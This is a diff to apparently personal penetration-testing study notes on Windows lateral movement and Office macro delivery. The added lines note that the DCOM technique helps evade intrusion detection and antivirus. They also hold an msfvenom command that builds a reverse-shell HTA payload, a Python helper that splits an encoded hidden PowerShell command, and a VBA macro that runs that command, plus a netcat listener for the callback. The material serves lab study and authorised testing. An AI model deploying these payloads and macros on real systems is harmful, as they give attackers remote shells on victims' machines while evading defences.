@@ -2267,7 +2267,10 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <TGS ticketFile>
     #+end_src 
     //TODO PWK p665 practice
 
-*** Distributed Component Object Model (DCOM) exploit
+*** Distributed Component Object Model (DCOM) exploit (Require: TCP 135 for DCOM, TCP 445 for SMB)
+    + merit:
+      - to some extent avoid Network Intrusion Detection or host-based antivirus
+
     + doc:
       - abuse Windows Management Instrumentation 
         - [[https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management- Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf]]
@@ -2353,6 +2356,36 @@ $com.Run("openNotePad")
    cd %appdata%
      # C:\Windows\System32\config\systemprofile\AppData\Roaming>
    #+end_src
+
+    #+begin_src powershell
+      ## generate the payload 
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta 
+    #+end_src
+
+    #+begin_src python
+      ## split the command to overcome the limit on size in Excel macros
+    str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
+    n = 50
+    for i in range(0, len(str), n):
+    print "Str = Str + " + '"' + str[i:i+n] + '"' 
+    #+end_src 
+
+    #+begin_src vba
+      ## parse(paste) the str splitted
+    Sub MyMacro()
+Dim Str As String
+  Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
+  Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
+  ...
+  Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
+  Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
+  Shell (Str)
+End Sub 
+    #+end_src
+    + then listen for the callback `nc.exe -lvnp 4444` 
+
+** Active Directory Persistence
+
 
 * TODO list
   + nmap: quick, full
